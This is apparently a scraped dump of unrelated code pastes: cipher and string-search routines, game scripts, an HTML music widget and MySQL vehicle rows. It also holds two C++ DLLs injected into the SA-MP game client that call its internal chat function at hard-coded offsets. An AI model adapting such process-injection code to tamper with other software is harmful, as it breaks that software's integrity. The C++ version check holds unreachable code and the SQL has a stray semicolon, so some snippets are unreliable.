            text = input(""\nEnter the ciphertext to decode: "")
            key = int(input(""\nEnter the number of rails: ""))
            print(""\nDecoded text:"", decode_RailFence(text, key))
        elif choice == '9' or choice == '10':
            mode = choice
            if mode == '9':
                text = input(""\nEnter the plaintext to encode: "")
            else:
                text = input(""\nEnter the ciphertext to decode: "")
            key = input(""\nEnter the key: "")
            print(""\nEncoded/Decoded text:"", vigenere_cipher(text, key, mode))
        elif choice == '0':
            print()
            print(""-"" * 28)
            print(""Exiting Program...  Goodbye!"")
            print(""-"" * 28)
            break
        else:
            print(""\nInvalid choice! Please enter a number between 1 and 13.\n"")

if __name__ == ""__main__"":
    main()

"
pEG6Um3V,Untitled,tazerman2,JavaScript,Monday 6th of May 2024 05:57:46 PM CDT,"		if (actor.getTemplate().getAiType() == NpcAiType.MAGE && !actor.getCast().isCastingNow())
		{
			// This list is used in order to avoid multiple calls on skills lists. Tests are made one after the other, and content is replaced when needed.
			List<L2Skill> defaultList;
			
			// -------------------------------------------------------------------------------
			// Heal
			defaultList = actor.getTemplate().getSkills(NpcSkillType.HEAL);
			if (!defaultList.isEmpty())
			{
				Player leader = actor.getLeader();
				
				// Go through all characters around the actor that belongs to its faction.
				for (Creature cha : actor.getKnownTypeInRadius(Creature.class, 1000))
				{
					if (leader.getStatus().getHpRatio() < 0.75)
						cha = leader;
					else if (actor.getStatus().getHpRatio() < 0.75)
						cha = actor;
					else if (cha instanceof BodyGuard && ((BodyGuard) cha).getclans().getname() == leader.getName())
						
						// Will affect only defenders or NPCs from same faction.
						if (!actor.isAttackingDisabled())
						{
							for (L2Skill sk : defaultList)
							{
								System.out.println(""name:"" + cha.getName() + "" sk: "" + sk.getName());
								actor.getCast().doCast(sk, cha, actor.getActiveWeapon());
								return;
							}
						}
					
					leader.getClan().getName();
					
				}
			}"
Pcs1K0Di,CAAB Basalt coin gen,nauseant,Lua,Monday 6th of May 2024 05:41:28 PM CDT,"function voidInv()
    turtle.select(1)
    for i=1,16 do
        turtle.select(i)
        turtle.drop()
    end 
end

function isBasalt()
    local blockID
    local success, data = turtle.inspectDown()
    if success then
       blockID = data.name
    end
    
    if data.name == ""minecraft:basalt"" then
        return true
    else
        return false
    end
end

function mine()
    turtle.select(1)
    while not isBasalt() do
        turtle.select(1)
    end
    turtle.digDown()
end

function craft()
    local inv = {11, 12, 15, 16}
    for i=1,2 do
        turtle.transferTo(inv[1], 1)
        turtle.transferTo(inv[2], 1)
        turtle.transferTo(inv[3], 1)
        turtle.transferTo(inv[4], 1)
        turtle.craft()
    end
    
end

function uppies()
    turtle.select(1)
    turtle.dropUp()
end

local function main()
    while redstone.getInput(""back"") do
        for i = 1, 4 do
            mine()
        end
        craft()
        uppies()
    end
    os.pullEvent(""redstone"")
    voidInv()
end

voidInv()
while true do
    main()
end"
C1rapmRL,Untitled,Hidend,C++,Monday 6th of May 2024 05:08:57 PM CDT,"#include <Windows.h>

DWORD samp_base = 0;

const DWORD OFFSETS[6][2]{
    /*ChatInfo, AddMsg*/
    {0x21A0E4, 0x645A0}, // 037-r1 - 0
    {0x021A0EC, 0x64670}, // 037-r2 - 1
    {0x026E8C8, 0x679F0}, // 037-r3_1 - 2
    {0x026E9F8, 0x68130}, // 037-r4 - 3 
    {0x026E9F8, 0x68170}, // 037-r4_2 -4
    {0x026EB80, 0x68170}, // 037-r5_1 - 5
};

int get_samp_version_id()
{
    int version_current = -1;

    if (samp_base)
    {
        int* x = reinterpret_cast<int*>((char*)samp_base + 0x128);
        int version_id = *x;  // Directly dereference the pointer
        switch (version_id) {
        case 0x5542F47A: // 
            version_current = 0;
            break;
        case 0x59C30C94: // R2
            version_current = 1;
            break;

            version_id = *(DWORD*)(samp_base + 0x120);

            switch (version_id) {
            case 0x5C0B4243: // R3
                version_current = 2;
                break;
            case 0x5DD606CD: // R4 - v1
                version_current = 3;
                break;
            case 0x6094ACAB: // R4 - v2
                version_current = 4;
                break;
            case 0x6372C39E: // R5, ni nos interesa pero meh
                version_current = 5;
                break;
            }

        }
    }
    return version_current;
}

void addMessageToChat(unsigned dwColor, const char* szMsg, ...)
{
    int version = get_samp_version_id();
    if (version == -1)
        return;

    DWORD chatInfoOffset = OFFSETS[version][0];
    DWORD addMsgOffset = OFFSETS[version][1];

    auto addMessage = reinterpret_cast<void(__thiscall*)(void* pChat, unsigned color, const char* message)>(samp_base + addMsgOffset);
    addMessage(*reinterpret_cast<void**>(samp_base + chatInfoOffset), dwColor, szMsg);
}


int init()
{
    samp_base  = (DWORD)LoadLibraryA(""samp.dll"");
    while (true)
    {
        addMessageToChat(-1, ""Hidend // Shaarawy // <3"");
        Sleep(5000);
    }
    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	switch (dwReasonForCall)
	{
	case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)init, NULL, NULL, NULL);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}"
3jw53sdS,Untitled,Hidend,C++,Monday 6th of May 2024 05:03:52 PM CDT,"//hidend
#include <Windows.h>
#include <d3d9.h>
#include <cstdio>
#include <iostream>

uint32_t samp_base = 0;

const DWORD OFFSETS[6][2]{
    /*ChatInfo, AddMsg*/
    {0x21A0E4, 0x645A0}, // 037-r1 - 0
    {0x021A0EC, 0x64670}, // 037-r2 - 1
    {0x026E8C8, 0x679F0}, // 037-r3_1 - 2
    {0x026E9F8, 0x68130}, // 037-r4 - 3 
    {0x026E9F8, 0x68170}, // 037-r4_2 -4
    {0x026EB80, 0x68170}, // 037-r5_1 - 5
};

int get_samp_version_id()
{
    int version_current = -1;

    if (samp_base)
    {
        std::cout << ""Dentro!"" << std::endl;
        int* x = reinterpret_cast<int*>((char*)samp_base + 0x128);
        int version_id = *x;  // Directly dereference the pointer
        std::cout << ""Version1: "" << version_id << std::endl;
        switch (version_id) {
        case 0x5542F47A: // 
            std::cout << ""Hit!"" << version_id << std::endl;
            version_current = 0;
            break;
        case 0x59C30C94: // R2
            version_current = 1;
            break;

            version_id = *(DWORD*)(samp_base + 0x120);

            switch (version_id) {
            case 0x5C0B4243: // R3
                version_current = 2;
                break;
            case 0x5DD606CD: // R4 - v1
                version_current = 3;
                break;
            case 0x6094ACAB: // R4 - v2
                version_current = 4;
                break;
            case 0x6372C39E: // R5, ni nos interesa pero meh
                version_current = 5;
                break;
            }

        }
    }
    return version_current;
}

void addMessageToChat(D3DCOLOR dwColor, const char* szMsg, ...)
{
    int version = get_samp_version_id();
    std::cout << ""Version2: "" << version << std::endl;
    if (version == -1)
        return;

    DWORD chatInfoOffset = OFFSETS[version][0];
    DWORD addMsgOffset = OFFSETS[version][1];

    std::cout << ""chatInfoOffset: "" << chatInfoOffset << std::endl;
    std::cout << ""addMsgOffset: "" << addMsgOffset << std::endl;
    auto addMessage = reinterpret_cast<void(__thiscall*)(void* pChat, unsigned color, const char* message)>(samp_base + addMsgOffset);
    addMessage(*reinterpret_cast<void**>(samp_base + chatInfoOffset), dwColor, szMsg);
}


int init()
{
    std::cout << ""init"" << std::endl;
    samp_base  = (DWORD)LoadLibraryA(""samp.dll"");
    while (true)
    {
        addMessageToChat(-1, ""Hidend // Shaarawy // <3"");
        Sleep(5000);
    }
    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	switch (dwReasonForCall)
	{
	case DLL_PROCESS_ATTACH:
        AllocConsole();
        freopen(""CONOUT$"", ""w"", stdout);
        std::cout << ""injected"" << std::endl;
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)init, NULL, NULL, NULL);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}"
E2acK7VQ,knuth morris pratt algorithm c#,Pearlfromsu,C#,Monday 6th of May 2024 05:01:10 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class KnutMorrisPratt : ISubstringSearch {
        int[] PrefixFunctionFast(string str)
        {
            int[] result = new int[str.Length];
            result[0] = 0;
            for (int i = 1; i < str.Length; i++)
            {
                int k = result[i - 1];
                while (k > 0 && str[k] != str[i])
                {
                    k = result[k - 1];
                }
                if (str[k] == str[i])
                {
                    k++;
                }
                result[i] = k;
            }
            return result;
        }
        int[] PrefixFunction(string str) {
            int n = str.Length;
            int[] p = new int[n];
            for (int i = 0; i < n; i++)
            {
                for (int k = 0; k < i; k++)
                {
                    bool fl = true;
                    for (int j = 0; j < k + 1; j++)
                    {
                        if (str[j] != str[i - k + j])
                        {
                            fl = false;
                            break;
                        }
                    }
                    if (fl)
                        p[i] = (byte)(k + 1);
                }
            }               
            return p;
        }
        public List<int> FindAll(string text, string substring) {
            List<int> res = new List<int>();
            int[] prefix_sub = PrefixFunctionFast(substring);
            int k = 0;
            for(int i = 0; i < text.Length; i++) 
            {
                while (k > 0 && substring[k] != text[i]) { k = prefix_sub[k - 1]; }
                if (substring[k] == text[i]) k++;
                if (k == substring.Length)
                {
                    res.Add(i - k + 1);
                    k = prefix_sub[k - 1];
                }
            }
            return res;
        }
    }
}
"
RxtdGjQ0,boyer moore algorithm c#,Pearlfromsu,C#,Monday 6th of May 2024 04:56:19 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class Mur : ISubstringSearch {

        public List<int> FindAll(string text, string substring)
        {
            List<int> res = new List<int>();
            char[] pattern = substring.ToCharArray();
            char[] textChAr = text.ToCharArray();
            if (pattern.Length > textChAr.Length)
            {
                return res;
            }
            byte[] StopSymbols = BuildStopCharTable(pattern);
            byte[] Suffixes = BuildSuffixTable(pattern);
            int offset = 0;
            int scan;
            int last = pattern.Length - 1;
            int maxoffset = textChAr.Length - pattern.Length;
            while (offset <= maxoffset)
            {
                scan = last;
                bool fl = true;
                while (pattern[scan] == textChAr[scan + offset])
                {
                    scan--;
                    if (scan < 0)
                    {
                        res.Add(offset);
                        fl = false;
                        offset += Math.Max(StopSymbols[textChAr[offset + last]], Suffixes[pattern.Length]);
                        break;
                    }
                }
                if (fl)
                    offset += Math.Max(StopSymbols[textChAr[offset + last]], Suffixes[scan + 1]);               
            }
            return res;
        }
        private static byte[] BuildStopCharTable(char[] pattern)
        {
            byte[] StopSymbols = new byte[0x10000];
            for (int i = 0; i < StopSymbols.Length; i++)
            {
                StopSymbols[i] = (byte)pattern.Length;
            }
            int last = pattern.Length - 1;
            for (int i = 0; i < last; i++)
            {
                StopSymbols[pattern[i]] = (byte)(last - i);
            }
            return StopSymbols;
        }
        private byte[] BuildSuffixTable(char[] pattern)
        {
            byte[] suffixes = new byte[pattern.Length + 1];
            for (int i = 0; i < pattern.Length; i++)
            {
                suffixes[i] = (byte)pattern.Length;
            }
            suffixes[pattern.Length] = 1;
            StringBuilder sb1 = new StringBuilder();
            StringBuilder sb2 = new StringBuilder();
            for (int i = pattern.Length - 1; i >= 0; i--)
            {
                for (int at = i; at < pattern.Length; at++)
                {
                    for (int k = at; k < pattern.Length; k++)
                    {
                        sb1.Append(pattern[k]);
                    }
                    for (int j = at - 1; j >= 0; j--)
                    {
                        for (int k = j; k < j + sb1.Length; k++)
                        {
                            sb2.Append(pattern[k]);
                        }
                        bool fl = true;
                        for (int k = 0; k < sb1.Length; k++)
                        {
                            if (sb1[k] != sb2[k])
                            {
                                fl = false;
                                break;
                            }
                        }
                        if (fl)
                        {
                            suffixes[i] = (byte)(at - j);
                            sb2.Clear();
                            break;
                        }
                        sb2.Clear();
                    }
                    sb1.Clear();
                }
            }
            return suffixes;
        }
    }
}
    "
pGKbzGW6,"03. Hwei, The Visionary | Reproductor de Música Móvil",Athenea-Owl,HTML,Monday 6th of May 2024 04:55:10 PM CDT,"---------HWEI, THE VISIONARY | REPRODUCTOR DE MÚSICA MÓVIL PARA FORO MODERNBB----------

<center><div class=""atherp3""><div class=""atherp3ic""><i class=""fas fa-signal""></i><i class=""fas fa-wifi""></i><div class=""athec3""><a href=""https://athenea-owl.tumblr.com""><img src=""https://i.servimg.com/u/f81/19/51/91/06/logoat10.png""/></a></div><i class=""fas fa-battery-three-quarters"" style=""margin-left: 170px;""></i> 4:06 </div><div class=""atherp3i""><div class=""atherp3img"" style=""background-image: url(https://i.servimg.com/u/f81/19/51/91/06/78c85910.jpg);""></div>
<b>Hwei, The Visionary</b>
<span>League Of Legends</span>
<div class=""atherp3l"">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
</div><audio src=""https://dl.dropboxusercontent.com/scl/fi/tzvb57b5uq04iqc0u6ilg/x2mate.com-Hwei-Champion-Theme-_-League-of-Legends-320-kbps.mp3?rlkey=3qw6y4xa7dg4fj5vt765ulwb9&"" controls=""controls"" type=""audio/mpeg"" preload=""preload""></audio></div></div></center>

<style>.atherp3{--3fondo: black;--3fondo2: linear-gradient(0deg, rgba(45,253,118,1) 0%, rgba(0,113,61,1) 50%);--3iconos: --white;--3titulo: black;--3artista: white;--3repro: #26e76d;--3lyric: white;}</style>
<link rel=""stylesheet""href=""https://use.fontawesome.com/releases/v5.12.1/css/all.css"" crossorigin=""anonymous""><link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/b672953ntlm9n3lc8m396/03.-Hwei-The-Visionary-Reproductor-de-musica-Modernbb.css?rlkey=zo802gwa7p3zjbawkbm1188gq&st=fl4qufir&"" crossorigin=""anonymous"">


---------HWEI, THE VISIONARY | REPRODUCTOR DE MÚSICA MÓVIL PARA FORO PHPBB----------

<center><div class=""atherp3""><div class=""atherp3ic""><i class=""fas fa-signal""></i><i class=""fas fa-wifi""></i><div class=""athec3""><a href=""https://athenea-owl.tumblr.com""><img src=""https://i.servimg.com/u/f81/19/51/91/06/logoat10.png""/></a></div><i class=""fas fa-battery-three-quarters"" style=""margin-left: 170px;""></i> 4:06 </div><div class=""atherp3i""><div class=""atherp3img"" style=""background-image: url(https://i.servimg.com/u/f81/19/51/91/06/78c85910.jpg);""></div>
<b>Hwei, The Visionary</b>
<span>League Of Legends</span>
<div class=""atherp3l"">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
</div><audio src=""https://dl.dropboxusercontent.com/scl/fi/tzvb57b5uq04iqc0u6ilg/x2mate.com-Hwei-Champion-Theme-_-League-of-Legends-320-kbps.mp3?rlkey=3qw6y4xa7dg4fj5vt765ulwb9&"" controls=""controls"" type=""audio/mpeg"" preload=""preload""></audio></div></div></center>

<style>.atherp3{--3fondo: black;--3fondo2: linear-gradient(0deg, rgba(45,253,118,1) 0%, rgba(0,113,61,1) 50%);--3iconos: white;--3titulo: black;--3artista: white;--3repro: #26e76d;--3lyric: white;}</style>
<link rel=""stylesheet"" href=""https://use.fontawesome.com/releases/v5.12.1/css/all.css"" crossorigin=""anonymous""><link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/mcdjapyhr4hy4hk9xo63t/03.-Hwei-The-Visionary-Reproductor-de-musica-Phpbb.css?rlkey=01lizsvgl3xyf1fvpvtv3qjnb&st=nnmcq1gr&"" crossorigin=""anonymous"">
"
qA02bCZB,Funcion Menu,Mac2179,C++,Monday 6th of May 2024 04:29:09 PM CDT,"#include <iostream>
#include<wchar.h>
#include<locale.h>
#include<clocale>
#include<cstdlib>
#include<time.h>
#include<string.h>
#ifndef BORRADORJUEGO_H_INCLUDED
#define BORRADORJUEGO_H_INCLUDED

using namespace std;


void linea(){
 cout<<""---------------------""<<endl;//Linea multiuso
}
void menu(){//Menu General del Juego
    cout<< ""GRAN CERDO"" << endl;
    linea();
    cout<< ""1 - JUGAR"" << endl;
    cout<< ""2 - ESTADISTICAS"" << endl;
    cout<< ""3 - CERDITOS"" << endl;
    linea();
    cout<< ""0 - SALIR"" << endl << endl;

}"
0n6Eyza1,TABLE `fractionvehicles`,yathework,MySQL,Monday 6th of May 2024 04:06:21 PM CDT,"(8, 'EMS25', 'rumpo2', '{""x"":376.589417,""y"":-577.6402,""z"":29.2189026}', '{""x"":0.0655394644,""y"":-0.100640148,""z"":97.52606}', 2, 2, 0, 0, '{""PrimColor"":{""Red"":255,""Green"":255,""Blue"":255,""Alpha"":255},""SecColor"":{""Red"":255,""Green"":255,""Blue"":255,""Alpha"":255},""PrimModColor"":0,""SecModColor"":0,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":0,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1,""ColorAdditional"":0,""Cover"":0,""CoverColor"":1,""Frame"":-1,""NeonIndex"":-1}'),
	(8, 'EMS26', 'rumpo2', '{""x"":357.490021,""y"":-601.6303,""z"":29.1604252}', '{""x"":0.09472485,""y"":0.3259711,""z"":175.164246}', 2, 2, 0, 0, '{""PrimColor"":{""Red"":255,""Green"":255,""Blue"":255,""Alpha"":255},""SecColor"":{""Red"":255,""Green"":255,""Blue"":255,""Alpha"":255},""PrimModColor"":0,""SecModColor"":0,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":0,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1,""ColorAdditional"":0,""Cover"":0,""CoverColor"":1,""Frame"":-1,""NeonIndex"":-1}');
    (18, 'LSSD01', 'policet', '{""x"":1309.0457,""y"":222.9328,""z"":-48.57221}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD02', 'sheriff2', '{""x"":1309.5581,""y"":229.71214,""z"":-48.935184}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD03', 'sheriff2', '{""x"":1309.5591,""y"":233.66566,""z"":-48.935436}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD04', 'sheriff2', '{""x"":1309.6301,""y"":239.63449,""z"":-48.93584}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD05', 'sheriff2', '{""x"":1309.6334,""y"":243.33525,""z"":-48.93573}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD06', 'sheriff2', '{""x"":1309.6459,""y"":247.78432,""z"":-48.93555}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD07', 'sheriff2', '{""x"":1309.6898,""y"":251.44687,""z"":-48.93544}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD08', 'riot', '{""x"":1309.0919,""y"":257.9826,""z"":-48.905243}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD09', 'swift', '{""x"":-485.1076,""y"":5994.593,""z"":31.735636}', '{""x"":0.00,""y"":0.00,""z"":-47.963707}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD10', 'polmav', '{""x"":-471.09744,""y"":5979.627,""z"":32.223793}', '{""x"":0.00,""y"":0.00,""z"":-43.11794}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
    (18, 'LSSD11', 'policet', '{""x"":1309.706,""y"":223.15884,""z"":-48.572628}', '{""x"":0.00,""y"":0.00,""z"":90.00}', 3, 3, 111, 111, '{""PrimColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""SecColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":255},""PrimModColor"":-1,""SecModColor"":-1,""Muffler"":-1,""SideSkirt"":-1,""Hood"":-1,""Spoiler"":-1,""Lattice"":-1,""Wings"":-1,""Roof"":-1,""Vinyls"":-1,""FrontBumper"":-1,""RearBumper"":-1,""Engine"":3,""Turbo"":0,""Horn"":-1,""Transmission"":2,""WindowTint"":1,""Suspension"":-1,""Brakes"":2,""Headlights"":-1,""NumberPlate"":0,""Wheels"":-1,""WheelsType"":0,""WheelsColor"":0,""NeonColor"":{""Red"":0,""Green"":0,""Blue"":0,""Alpha"":0},""Armor"":-1}'),
